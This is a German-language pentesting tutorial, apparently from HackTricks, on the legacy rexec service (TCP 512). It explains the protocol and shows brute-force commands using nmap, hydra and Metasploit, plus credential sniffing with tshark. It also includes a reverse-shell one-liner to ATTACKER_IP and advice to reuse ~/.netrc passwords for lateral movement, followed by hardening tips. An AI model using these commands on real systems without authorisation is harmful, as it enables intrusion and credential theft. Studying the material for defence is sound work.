# 512 - Pentesting Rexec

{{#include ../banners/hacktricks-training.md}}

## Grundinformationen

Rexec (remote **exec**) ist einer der urspr√ºnglichen Berkeley *r*-Dienste (neben `rlogin`, `rsh`, ‚Ä¶). Es bietet eine **Remote-Befehlsausf√ºhrungs**-Funktionalit√§t, die **nur mit einem Klartext-Benutzernamen und Passwort authentifiziert** ist. Das Protokoll wurde Anfang der 1980er Jahre definiert (siehe RFC 1060) und wird heutzutage als **von Grund auf unsicher** angesehen. Dennoch ist es in einigen veralteten UNIX- / netzwerkgebundenen Ger√§ten standardm√§√üig aktiviert und taucht gelegentlich w√§hrend interner Pentests auf.

**Standardport:** TCP 512 (`exec`)
```
PORT    STATE SERVICE
512/tcp open  exec
```
> üî•  Der gesamte Datenverkehr ‚Äì einschlie√ülich Anmeldeinformationen ‚Äì wird **unverschl√ºsselt** √ºbertragen. Jeder, der in der Lage ist, das Netzwerk abzuh√∂ren, kann den Benutzernamen, das Passwort und den Befehl wiederherstellen.

### Protokoll√ºbersicht

1. Der Client verbindet sich mit TCP 512.
2. Der Client sendet drei **NUL-terminierte** Zeichenfolgen:
* die Portnummer (als ASCII), an die er stdout/stderr empfangen m√∂chte (oft `0`),
* den **Benutzernamen**,
* das **Passwort**.
3. Eine letzte NUL-terminierte Zeichenfolge mit dem **Befehl**, der ausgef√ºhrt werden soll, wird gesendet.
4. Der Server antwortet mit einem einzelnen 8-Bit-Statusbyte (0 = Erfolg, `1` = Fehler), gefolgt von der Befehlsausgabe.

Das bedeutet, dass Sie den Austausch mit nichts anderem als `echo -e` und `nc` reproduzieren k√∂nnen:
```bash
(echo -ne "0\0user\0password\0id\0"; cat) | nc <target> 512
```
Wenn die Anmeldeinformationen g√ºltig sind, erhalten Sie die Ausgabe von `id` direkt √ºber dieselbe Verbindung.

### Manuelle Verwendung mit dem Client

Viele Linux-Distributionen liefern immer noch den Legacy-Client im **inetutils-rexec** / **rsh-client**-Paket aus:
```bash
rexec -l user -p password <target> "uname -a"
```
Wenn `-p` weggelassen wird, fordert der Client interaktiv das Passwort an (sichtbar im Netzwerk im Klartext!).

---
## Enumeration & Brute-forcing

### [**Brute-force**](../generic-hacking/brute-force.md#rexec)

### Nmap
```bash
nmap -p 512 --script rexec-info <target>
# Discover service banner and test for stdout port mis-configuration

nmap -p 512 --script rexec-brute --script-args "userdb=users.txt,passdb=rockyou.txt" <target>
```
Das `rexec-brute` NSE verwendet das oben beschriebene Protokoll, um Anmeldeinformationen sehr schnell auszuprobieren.

### Hydra / Medusa / Ncrack
```bash
hydra -L users.txt -P passwords.txt rexec://<target> -s 512 -t 8
```
`hydra` hat ein dediziertes **rexec**-Modul und bleibt der schnellste Offline-Bruteforcer. `medusa` (`-M REXEC`) und `ncrack` (`rexec`-Modul) k√∂nnen auf die gleiche Weise verwendet werden.

### Metasploit
```
use auxiliary/scanner/rservices/rexec_login
set RHOSTS <target>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```
Das Modul wird bei Erfolg eine Shell erzeugen und die Anmeldeinformationen in der Datenbank speichern.

---
## Sniffing von Anmeldeinformationen

Da alles im Klartext vorliegt, sind **Netzwerkaufzeichnungen unbezahlbar**. Mit einer Kopie des Traffics k√∂nnen Sie Anmeldeinformationen extrahieren, ohne das Ziel zu ber√ºhren:
```bash
tshark -r traffic.pcap -Y 'tcp.port == 512' -T fields -e data.decoded | \
awk -F"\\0" '{print $2":"$3" -> "$4}'  # username:password -> command
```
(In Wireshark *Decode As ‚Ä¶‚Äã* TCP 512 ‚Üí REXEC aktivieren, um sch√∂n geparste Felder anzuzeigen.)

---
## Tipps zur Nachnutzung

* Befehle werden mit den Rechten des angegebenen Benutzers ausgef√ºhrt. Wenn `/etc/pam.d/rexec` falsch konfiguriert ist (z. B. `pam_rootok`), sind Root-Shells manchmal m√∂glich.
* Rexec ignoriert die Shell des Benutzers und f√ºhrt den Befehl √ºber `/bin/sh -c <cmd>` aus. Sie k√∂nnen daher typische Shell-Escape-Tricks (`;`, ``$( )``, Backticks) verwenden, um mehrere Befehle zu verketten oder Reverse-Shells zu starten:
```bash
rexec -l user -p pass <target> 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'
```
* Passw√∂rter werden oft in **~/.netrc** auf anderen Systemen gespeichert; wenn Sie einen Host kompromittieren, k√∂nnen Sie diese f√ºr laterale Bewegungen wiederverwenden.

---
## H√§rtung / Erkennung

* **Setzen Sie rexec nicht aus**; ersetzen Sie es durch SSH. Praktisch alle modernen *inetd* Superserver kommentieren den Dienst standardm√§√üig aus.
* Wenn Sie es behalten m√ºssen, beschr√§nken Sie den Zugriff mit TCP-Wrappers (`/etc/hosts.allow`) oder Firewall-Regeln und erzwingen Sie starke passworts pro Konto.
* √úberwachen Sie den Verkehr zu :512 und die Starts des `rexecd` Prozesses. Eine einzige Paketaufnahme reicht aus, um eine Kompromittierung zu erkennen.
* Deaktivieren Sie `rexec`, `rlogin`, `rsh` zusammen ‚Äì sie teilen sich den gr√∂√üten Teil des gleichen Codes und Schw√§chen.

---

## Referenzen

* Nmap NSE `rexec-brute` Dokumentation ‚Äì [https://nmap.org/nsedoc/scripts/rexec-brute.html](https://nmap.org/nsedoc/scripts/rexec-brute.html)
* Rapid7 Metasploit Modul `auxiliary/scanner/rservices/rexec_login` ‚Äì [https://www.rapid7.com/db/modules/auxiliary/scanner/rservices/rexec_login](https://www.rapid7.com/db/modules/auxiliary/scanner/rservices/rexec_login)
{{#include ../banners/hacktricks-training.md}}
